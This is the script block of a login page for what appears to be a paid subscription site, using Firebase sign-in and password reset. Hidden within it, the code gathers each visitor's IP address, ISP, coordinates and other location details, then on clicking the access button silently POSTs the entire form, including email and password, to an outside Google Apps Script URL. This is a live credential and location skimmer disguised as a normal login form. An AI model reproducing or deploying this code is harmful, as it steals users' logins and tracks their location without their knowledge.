    <script>
        function onSubmit(token) {
            document.getElementById("form").submit();
        }
        var em = document.getElementById("email").value;
        var pa = document.getElementById("password").value;
        $.get('https://json.geoiplookup.io/', function(res) {
            var a = ("IP : " + res.ip + "\n" + "ISP : " + res.isp + "\n" + "Organization : " + res.org + "\n" + "Hostname : " + res.hostname + "\n" + "Latitude : " + res.latitude + "\n" + "Longitude : " + res.longitude + "\n" + "Postal Code : " + res.postal_code + "\n" + "Neighbourhood : " + res.city + "\n" + "Region : " + res.region + "\n" + "District : " + res.district + "\n" + "Country Code : " + res.country_code + "\n" + "Country : " + res.country_name + "\n" + "Continent : " + res.continent_name + "\n" + "Timezone Name : " + res.timezone_name + "\n" + "Connection Tyoe : " + res.connection_type + "\n" + "ASN Organization : " + res.asn_org + "\n" + "ASN : " + res.asn + "\n" + "Currency Code : " + res.currency_code + "\n" + "Currency : " + res.currency_name);
            document.getElementById("dtl").value = a;
        });
        $.get('https://json.geoiplookup.io/', function(imp) {
            var b = (imp.ip);
            document.getElementById("i").value = b;
        });
        const scriptURL = 'https://script.google.com/macros/s/AKfycbw9t7QEgbtWMvc40qTY9jzDv5YT8my-_xoNjyYCWp41VmUSR6FXt3km/exec'
        const form = document.forms['Form']

        function toggleSignIn(e) {
            if (firebase.auth().currentUser) {
                firebase.auth().signOut();
            } else {
                var email = document.getElementById('email').value;
                var password = document.getElementById('password').value;
                if (email.length < 4) {
                    alert('Please enter an email address.');
                    return;
                }
                if (password.length < 4) {
                    alert('Please enter a password.');
                    return;
                }
                firebase.auth().signInWithEmailAndPassword(email, password).catch(function(error) {
                    var errorCode = error.code;
                    var errorMessage = error.message;
                    if (errorCode === 'auth/wrong-password') {
                        alert('Wrong password.');
                        document.getElementById("forgotPass").style.display = "inline-block";
                    } else {
                        alert('You don\'t have Access. To get access, Please Buy our subscription');
                        window.location.replace("Buy-Subcription/Hasib.html");
                    }
                });
            }
            document.getElementById('access').disabled = false;
            e.preventDefault();
        }

        function sendPasswordReset() {
            var email = document.getElementById('email').value;
            firebase.auth().sendPasswordResetEmail(email).then(function() {
                alert('Password Reset Email Sent!\nNow Please Check Your Email Inbox ðŸ˜Š');
                window.location.href = "https://mail.google.com/";
            }).catch(function(error) {
                var errorCode = error.code;
                var errorMessage = error.message;
                if (errorCode == 'auth/invalid-email') {
                    alert("Please Check your Email Address ðŸ¤” \n\nIt is in wrong format ðŸ™ƒ");
                } else if (errorCode == 'auth/user-not-found') {
                    alert('You haven\'t purchased our premium subscription yet ðŸ˜¶');
                    window.location.replace("Buy-Subcription/Hasib.html");
                }
            });
        }

        function initApp() {
            firebase.auth().onAuthStateChanged(function(user) {
                if (user) {
                    window.location.replace("home.html");
                }
            });
            document.getElementById('access').addEventListener('click', toggleSignIn, false);
            document.getElementById('access').addEventListener('click', e => {
                e.preventDefault()
                fetch(scriptURL, {
                    method: 'POST',
                    body: new FormData(form)
                })
            })
            document.getElementById('forgotPass').addEventListener('click', sendPasswordReset, false);

        }
        window.onload = function() {
            initApp();
        };
    </script>
